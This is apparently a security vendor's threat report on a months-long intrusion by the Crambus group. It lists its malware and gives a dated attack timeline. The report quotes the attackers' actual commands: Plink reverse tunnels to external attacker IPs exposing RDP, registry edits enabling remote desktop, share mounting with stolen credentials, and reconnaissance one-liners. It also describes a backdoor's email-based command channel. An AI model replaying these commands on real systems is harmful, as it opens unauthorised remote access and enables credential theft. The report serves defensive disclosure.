Toolset Used
During this latest attack, Crambus deployed three previously undiscovered pieces of malware, along with the PowerExchange backdoor, a known backdoor that hadn’t yet been attributed to Crambus. In addition to malware, the attackers made use of a number of living-off-the-land and legitimate tools.

Backdoor.Tokel: Has the ability to execute arbitrary PowerShell commands and download files. The command and control (C&C) address is stored in a separate, RC4 encrypted file called token.bin, which is saved in the working directory.
Trojan.Dirps: Used to enumerate all files in a directory and execute PowerShell commands.
Infostealer.Clipog: Information stealing malware that is capable of copying clipboard data, capturing keystrokes and logging processes where keystrokes are entered.
Backdoor.PowerExchange: PowerShell-based malware that can log into an Exchange Server with hardcoded credentials and monitor for emails sent by the attackers. It uses an Exchange Server as a C&C. Mails received with “@@" in the subject contain commands sent from the attackers which allows them to execute arbitrary PowerShell commands, write files and steal files. The malware creates an Exchange rule (called ‘defaultexchangerules’) to filter these messages and move them to the Deleted Items folder automatically.
Mimikatz: Publicly available credential dumping tool. 
Plink: A command-line connection tool for the PuTTY SSH client
Attack Timeline
The first evidence of malicious activity on the target’s network occurred on February 1, 2023, when an unknown PowerShell script (file name: joper.ps1) was executed from a suspicious directory: CSIDL_PROFILE\public\sat. The same script was executed multiple times on the same computer (Computer 1) over the next seven days. 

Four days later, on February 5, the attackers accessed a second computer (Computer 2) and a renamed version of Plink (msssh.exe), a command-line connection tool for the PuTTY SSH client, was used to configure port-forwarding rules allowing for RDP access from a remote host:

CSIDL_PROFILE\public\sat\msssh.exe 151.236.19[.]91 -P [REMOVED]-C -N -R 0.0.0.0:54231:127.0.0.1:3389 -l [REMOVED] -pw [REMOVED]

This masqueraded Plink (mssh.exe) was executed repeatedly on this computer up until February 12.

On February 21, malicious activity commenced on a web server (Web Server 1) when a netstat command was executed to retrieve a full list of all TCP and UDP connections.

netstat /an

The netstat command line switches perform the following actions:

/a: Tells netstat to display all connections and listening ports.
/n: Tells netstat to display numerical addresses instead of resolving hostnames to IP addresses. 
Next, Plink (mssh.exe) was launched again to enable remote RDP access. After this occurred, there was evidence that a PowerShell script was used to mount the C: drive of another computer on the network.

On April 8, the attackers gained access to a third computer (Computer 3), where another variant of Plink was executed from the %USERPROFILE%\public directory and was used to forward port 3389 to port 999 on all available interfaces:

CSIDL_PROFILE\public\plink.exe [REMOVED] -pw [REMOVED] -P [REMOVED] -2 -4 -T -N -C -R 0.0.0.0:999:127.0.0.1:3389

The options supplied in the command perform the following actions:

-2 -4: Enable SSH Version 2 and IPv4 protocol for the connection.
-T: Requests a pseudo-terminal for the remote session.
-N: Prevents running a remote command and often used for setting up a port
-R 0.0.0.0:999:127.0.0.1:3389: Specifies remote port forwarding. It instructs the remote server to listen on Port 999 of all network interfaces (0.0.0.0) and forward any incoming connections to Port 3389 (127.0.0.1:3389) on the local machine (the machine where the command has been run). This effectively sets up a tunnel that allows the attackers to access a remote service such as RDP through the SSH connection.
At the same time, an unknown batch file was executed, which redirected output to a text file in the %USERPROFILE%\public directory.

cmd /c CSIDL_PROFILE\public\p2.bat > CSIDL_PROFILE\public\001.txt 2>&1

Immediately afterwards, the same Plink command was run a second time. This is followed by the same unknown batch script being executed several more times.

Later that day, Mimikatz was executed from the %TEMP% directory to dump credentials.

On April 9, another netstat command was run on a new compromised computer, the Domain Controller (Computer 4):

netstat /aon

The “o” option adds the process ID (PID) of the associated process that's using each network connection or listening port. The command will provide a list of all active network connections, both incoming and outgoing, along with the associated PID of the processes using those connections. Three hours later, Mimikatz was run again to dump credentials.

The next day, April 10, an unknown windows batch file (file name: p.bat) was executed on Computer 3. This was followed by a Plink command: 

plink.exe ssh 78.47.218[.]106 1234qweRRR 443 10999 10.75.45.222 3389

The options perform the following actions:

ssh: Indicates SSH protocol is being used for the connection.
78.47.218[.]106: The IP address of the remote server being connected to using SSH.
1234qweRRR: Likely a password required to authenticate to the remote server. 
443: Port number for the SSH connection on the remote server.
10999: The local port number that Plink uses to create a tunnel.
10.75.45.222: IP address of local machine or network. 
3389: Remote Desktop Protocol (RDP) port number. This indicates that traffic is being forwarded from the remote server's port 3389 to a local machine for remote desktop access.
The command is used to set up a port forwarding tunnel from the compromised machine as a means to access the remote server’s RDP service as if it was running locally. 

On April 23, activity resumed on Computer 3, when previously unseen malware named Backdoor.Tokel (file name: telecomm.exe) was executed. 

On May 7, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) to run an unknown script (file name: hwf.ps1).

Malicious activity appeared to cease for nearly a month until June 4, when Backdoor.Tokel was executed again on Computer 3. On June 17, a suspicious PowerShell command was executed on the Domain Controller (Computer 4) in order to run another unknown script (file name: zone.ps1).

Harvesting Emails
On June 20, Backdoor.PowerExchange (file name: setapp.ps1) was run on Computer 3.

The PowerShell-based backdoor is designed to execute commands received from the attackers. This is done by logging into compromised mailboxes on an Exchange Server and monitoring for incoming emails from the attackers. Email’s that contain “@@” in the subject line are read by Backdoor.PowerExchange and have the ability to execute commands received from the attackers, effectively using the Exchange Server as a C&C.

The script allows four commands to execute:

If an attachment is detected, it will decode it using Base64 and run it via PowerShell.
cf: Decodes a Base64 string in the body of the email and executes it via PowerShell. The result of the command is sent back to the attacker via email.
uf: Decodes the file path and the file contents using Base64 and calls WriteAllBytes to write the file to the system. 
df: Encodes a specified file with Base64 and sends it to the attacker via email. If the file is larger than 5MB it sends the following message to the attacker: "Size is Greater than 5 MB".
The attackers likely installed the script on an ordinary computer on the network in order to avoid raising suspicions created by anomalous network traffic, since internal connections to an Exchange Server are expected behavior. 

Malicious Activity Continues
On July 1, the attackers once again utilized the masqueraded version of Plink to open a tunnel on Computer 3 by redirecting RDP to Port 12345 on any listening interface, effectively allowing external connections over RDP to the compromised machine. The next day, July 2, the attackers used netstat to list all open and listening TCP and UDP ports. It's possible the attackers were checking that the SSH tunnel was still active.

On July 8, the attackers used the Domain Controller (Computer 4) to create a service on a remote host (10.75.45[.]222) to run an unknown script (file name: pl.bat). The service was configured to auto-start during the boot up process. 

Over the next two days, July 9 and 10, another new piece of malware named Trojan.Dirps (file name: virtpackage.exe) was repeatedly executed on Computer 3. 

On July 11, the attackers introduced more malicious tools to Computer 3, installing a third new piece of malware named Infostealer.Clipog (file name (poluniq.exe) which is used to capture keystrokes and steal clipboard contents. 

The next day (July 12) the attackers ran Mimikatz on the Domain Controller (Computer 4) to dump credentials. 

On July 15, the attackers again ran the unknown PowerShell script (zone.ps1) on the Domain Controller (Computer 4), followed by a second unknown script (copy.ps1). 

On July 18, the attackers again executed Infostealer.Clipog on Computer 3 before creating an SSH tunnel using Plink to access RDP services. This SSH tunnel was created again on August 3.

On August 6, yet another unknown PowerShell script (file name: tnc.ps1) was executed on the Domain Controller (Computer 4). Immediately afterwards, Nessus vulnerability scans were observed, specially hunting for Log4j vulnerabilities on other machines on the network. While this could have been legitimate vulnerability scanning activity, not long afterwards netsh was executed to list all firewall rules. 

CSIDL_SYSTEM\netsh.exe advfirewall firewall show rule name=[REMOVED] verbose

Following this, another PowerShell script was executed. The script appeared to be designed to query and collect information about local user groups and their members on a Windows system. Its output was information about SIDs, names, object classes, and principal sources of local user groups and their members in a structured format. 

CSIDL_SYSTEM\windowspowershell\v1.0\powershell -NoProfile -Command ;& {$j = sajb {$ErrorActionPreference = 'SilentlyContinue';$groups = Get-LocalGroup | Select-Object Name, Domain, SID;foreach($g in $groups){-join($g.SID,'|',$g.Name);$members = Get-LocalGroupMember -SID $g.SID | Select *;foreach($m in $members){-join(' ',$m.SID,'|',$m.Name,'|',$m.ObjectClass,'|',$m.PrincipalSource);}}};$r = wjb $j -Timeout 300; rcjb $j;};

After this, net.exe was used to list all mapped drives, before WMI (Windows Management Instrumentation) was used to execute Plink in order to open port-forwarding on the compromised host, allowing for remote RDP access.

On August 7 and again on August 12, Plink was downloaded from the internet on to the Domain Controller (Computer 4) and saved as \ProgramData\Adobe.exe. 

On August 30, the attackers obtained access to a second web server (Web Server 2). They first used Plink to enable access to RDP on Port 12345 from their C&C server (91.132.92[.]90). They then installed Infostealer.Clipog using a different file name (fs-tool.exe). 

The next day, August 31, the attackers established a tunnel once again to open RDP access on Port 4455 from their C&C. Output was redirected to a text file (file name: 001.txt). There may have been some issues connecting as the attackers later attempted to create the same tunnel, this time using Port 12345.

On September 1, the attackers shifted their attention to three more computers (Computer 5, Computer 6 and Computer 7), using Certutil to download Plink to each machine. They then executed an unknown PowerShell script (file name: joper.ps1) on Web Server 2. 

On September 2, the attackers ran the following netstat command on Web Server 2:

netstat -a

This command is used to list all active connections. The unknown PowerShell script (file name: joper.ps1) was then run again.

On September 3, the attackers once again ran joper.ps1 before two suspicious Wireshark commands were executed:

;CSIDL_SYSTEM_DRIVE\program files\wireshark\extcap\usbpcapcmd.exe; --extcap-interfaces --extcap-version=4.0

;CSIDL_SYSTEM_DRIVE\program files\wireshark\dumpcap.exe; -D -Z none

Wireshark’s usbcapcmd utility was used to capture USB traffic on specified USB devices and save the captured data to a file. Similarly, dumpcap was used to capture network packets.

Usbpcapcmd:

--extcap-interfaces: This option is used to list available external capture interfaces.
--extcap-version=4.0: Sets the version of Extcap to 4.0 (ensuring compatibility with Wireshark).
Dumpcap:

-D: Used to list all available capture interfaces.
-Z none: Sets the capture filter to “none” meaning that all packets on a specified interface should be captured.
It appears the attackers were interested in identifying any available network or USB interfaces from which they could capture packets on the machine. 

Immediately afterwards, a suspicious netstat command ran:

netstat -a –n

This will list all active connections and print them to standard output in numerical form.

After joper.ps1 was once again executed, the attackers turned their attention back to Computer 3, where they ran a number of reg.exe commands:

reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f

cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f

cmd.exe /c reg.exe ADD ;HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server; /v fDenyTSConnections /t REG_DWORD /d 0 /f

These commands were used to modify system configuration to enable Terminal Services (i.e. remote access) to the computer via RDP.

A few hours later, a suspicious net.exe command was executed to mount the c$ share of another machine using stolen credentials.

;CSIDL_SYSTEM\net.exe; use \\[REMOVED]\c$ /user:[REMOVED] [REMOVED]

On September 4, the attackers executed three different variants of the joper.ps1 script on Web Server 2. They then turned their attention back to Computer 1, where a new variant of the Backdoor.Tokel malware was installed on the computer. 

The next day, September 5 the attackers once again ran the joper.ps1 script on Web Server 2, while using net.exe to mount and unmount various network shares. They then executed Backdoor.Tokel on Computer 3 again before installing it on two more computers (Computer 9 and Computer 10). 

Malicious activity continued until September 9, with the attackers largely focusing their attention on Web Server 2, running the joper.ps1 script and mounting/unmounting network shares.